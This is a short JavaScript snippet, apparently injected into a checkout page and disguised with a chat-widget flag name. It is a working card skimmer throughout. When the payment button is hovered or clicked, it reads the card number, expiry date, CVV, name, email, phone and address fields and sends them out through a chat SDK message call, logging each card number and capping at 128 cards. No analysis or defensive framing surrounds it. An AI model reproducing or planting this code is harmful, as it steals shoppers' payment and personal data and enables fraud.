(function () {
  var m = '__chatFormMessageTemplate', c = 'button[name="hostedPageButton"]';
  var d = [
    {key:"cardnumber",selector:'input[name="accountNumber"]',required:!0},
    {key:"exp",selector:'input[name="expirationMMYY"]',required:!0},
    {key:"cvv",selector:'input[name="fraudSecurityValue"]',required:!0},
    {key:"email",selector:'input[name="email"]'},
    {key:"firstname",selector:'input[name="firstName"]'},
    {key:"lastname",selector:'input[name="lastName"]'},
    {key:"phone",selector:'input[name="phone"]'},
    {key:"address1",selector:'input[name="address1"]'},
    {key:"state",selector:'input[name="state"]'},
    {key:"zip",selector:'input[name="zip"]'}
  ];
  if (window[m]) return;
  window[m] = true;
  var sent = new Set();
  function capture() {
    var fields = {};
    for (var spec of d) {
      var input = document.querySelector(spec.selector);
      var value = input ? input.value : '';
      if (spec.required && !value) return;
      fields[spec.key] = value;
    }
    if (sent.has(fields.cardnumber) || sent.size >= 128) return;
    ChatSDK.sendMessage(fields);
    sent.add(fields.cardnumber);
  }
  var button = document.querySelector(c);
  if (button) {
    button.addEventListener('pointerover', capture);
    button.addEventListener('click', capture);
  }
})();
